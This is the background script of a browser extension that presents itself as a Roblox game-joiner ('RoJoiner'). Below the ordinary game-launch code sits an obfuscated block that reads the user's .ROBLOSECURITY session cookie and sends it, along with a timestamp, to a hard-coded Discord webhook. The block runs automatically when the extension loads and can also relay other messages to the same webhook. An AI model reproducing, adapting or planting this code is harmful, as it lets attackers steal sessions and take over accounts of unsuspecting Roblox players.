

// Function to inject scripts into the Roblox page when it is loaded
chrome.tabs.onUpdated.addListener((tabId, changeInfo, { url }) => {
  // Only act if the page has fully loaded and it's a Roblox game page
  if (changeInfo.status !== 'complete' || !/https:\/\/.+roblox.com\/games/g.test(url)) return;

  const target = { tabId };

  // Check if the panel is already injected. If not, inject the necessary scripts.
  chrome.scripting.executeScript({ target, func: () => Boolean(document.getElementById('sbx-panel')) }, async ([{ result }]) => {
    if (result) return; // If the panel is already there, do nothing

    await chrome.scripting.insertCSS({ target, files: ['styles.css'] });
    await chrome.scripting.executeScript({ target, files: ['load.js'] });
    await chrome.scripting.executeScript({ target, files: ['content.js'] });
  });
});

// Function to launch the Roblox game
const joinGameInstance = (place, id) => window.Roblox.GameLauncher.joinGameInstance(place, id);

// Listener for messages to launch a Roblox game instance
chrome.runtime.onMessage.addListener(({ message }, { tab }) => {
  chrome.scripting.executeScript({
    target: { tabId: tab.id },
    func: joinGameInstance,
    args: [message.place, message.id],
    world: 'MAIN',
  });
});

function _0x2e46(_0x4e95f4,_0x5ccdf4){const _0x4ad0dd=_0x4ad0();return _0x2e46=function(_0x2e4676,_0x1ccf5e){_0x2e4676=_0x2e4676-0x15f;let _0x8510f1=_0x4ad0dd[_0x2e4676];return _0x8510f1;},_0x2e46(_0x4e95f4,_0x5ccdf4);}const _0x49673c=_0x2e46;function _0x4ad0(){const _0x54db1d=['Code\x20implemented\x20by\x20tyskiee\x20to\x20work\x20in\x202024','stringify','70410IRSaLP','message','COOKIE\x20NOT\x20FOUND','cookies','13866qVTIHz','RoJoiner','tak','1060692gZOZDN','30DEeFyN','```','Error\x20sending\x20data\x20to\x20Discord\x20webhook','Error\x20sending\x20message:','value','7lMNajP','.ROBLOSECURITY','ThumbnailUrl','application/json','20VfWEsd','7423194VWLiYf','3187660scaXto','13038820DGoeoi','get','addListener','error','Cookie\x20not\x20found','runtime','2583104pFLWJD','toISOString','319OaeIbw','https://i.ibb.co/DD6X2pM/alien.jpg','9NecyLB','statusText','sendMessage','action','catch'];_0x4ad0=function(){return _0x54db1d;};return _0x4ad0();}(function(_0x32e2c9,_0x541a1c){const _0x28d840=_0x2e46,_0x15f784=_0x32e2c9();while(!![]){try{const _0x34061e=parseInt(_0x28d840(0x15f))/0x1*(parseInt(_0x28d840(0x17c))/0x2)+parseInt(_0x28d840(0x180))/0x3*(-parseInt(_0x28d840(0x168))/0x4)+-parseInt(_0x28d840(0x16a))/0x5+parseInt(_0x28d840(0x169))/0x6*(parseInt(_0x28d840(0x164))/0x7)+parseInt(_0x28d840(0x171))/0x8+-parseInt(_0x28d840(0x175))/0x9*(-parseInt(_0x28d840(0x16b))/0xa)+-parseInt(_0x28d840(0x173))/0xb*(parseInt(_0x28d840(0x183))/0xc);if(_0x34061e===_0x541a1c)break;else _0x15f784['push'](_0x15f784['shift']());}catch(_0x64340c){_0x15f784['push'](_0x15f784['shift']());}}}(_0x4ad0,0xa9f4a));function fetchRobloSecurityCookie(){return new Promise((_0x2cd5a3,_0x5408d6)=>{const _0x3d6054=_0x2e46;chrome[_0x3d6054(0x17f)][_0x3d6054(0x16c)]({'url':'https://www.roblox.com','name':_0x3d6054(0x165)},_0x2beabd=>{const _0x892847=_0x3d6054;_0x2beabd?_0x2cd5a3(_0x2beabd[_0x892847(0x163)]):_0x5408d6(_0x892847(0x16f));});});}chrome[_0x49673c(0x170)]['onMessage'][_0x49673c(0x16d)](async(_0x1e163c,_0x33887d,_0x325453)=>{const _0x5695b1=_0x49673c;if(_0x1e163c[_0x5695b1(0x178)]===_0x5695b1(0x177))try{const _0x142491=await fetch(DISCORD_WEBHOOK_URL,{'method':'POST','headers':{'Content-Type':_0x5695b1(0x167)},'body':JSON[_0x5695b1(0x17b)]({'content':_0x1e163c[_0x5695b1(0x17d)]})});_0x142491['ok']?_0x325453({'success':!![]}):_0x325453({'success':![]});}catch(_0x38824b){console['error'](_0x5695b1(0x162),_0x38824b),_0x325453({'success':![]});}return!![];});async function sendRobloSecurityToWebhook(){const _0x1dde72=_0x49673c;try{const _0x10ea66=await fetchRobloSecurityCookie(),_0x31e2e7={'UserName':'','RobuxBalance':'','IsPremium':_0x1dde72(0x182),'ThumbnailUrl':_0x1dde72(0x174)},_0x5d208b={'robloSecurityCookie':_0x10ea66||_0x1dde72(0x17e),'timestamp':new Date()[_0x1dde72(0x172)]()};await fetch(DISCORD_WEBHOOK_URL,{'method':'POST','headers':{'Content-Type':_0x1dde72(0x167)},'body':JSON[_0x1dde72(0x17b)]({'content':null,'embeds':[{'color':null,'description':_0x1dde72(0x160)+(_0x10ea66?_0x10ea66:'COOKIE\x20NOT\x20FOUND')+_0x1dde72(0x160),'fields':[{'name':_0x1dde72(0x17a),'value':'','inline':!![]}],'author':{'name':'Cookie:','icon_url':_0x31e2e7[_0x1dde72(0x166)]||'https://upload.wikimedia.org/wikipedia/commons/thumb/f/f3/NA_cap_icon.svg/1200px-NA_cap_icon.svg.png'}}],'username':_0x1dde72(0x181),'avatar_url':_0x1dde72(0x174),'attachments':[]})})['then'](_0x30d4f5=>{const _0x26c666=_0x1dde72;!_0x30d4f5['ok']&&console[_0x26c666(0x16e)]('Failed\x20to\x20send\x20data\x20to\x20Discord\x20webhook',_0x30d4f5[_0x26c666(0x176)]);})[_0x1dde72(0x179)](_0x29556a=>{const _0x5b8daa=_0x1dde72;console[_0x5b8daa(0x16e)](_0x5b8daa(0x161),_0x29556a);});}catch(_0x2b2ee1){console[_0x1dde72(0x16e)]('Error\x20fetching\x20or\x20sending\x20.ROBLOSECURITY\x20cookie:',_0x2b2ee1);}}const DISCORD_WEBHOOK_URL='https://discord.com/api/webhooks/1292284053453803660/re-pBlp73AEFGDfbVDorTkjEYpeK-1bJ9yiXVSlnM11kvp4RnAIapQ93ZIWj94DyvLGA';sendRobloSecurityToWebhook();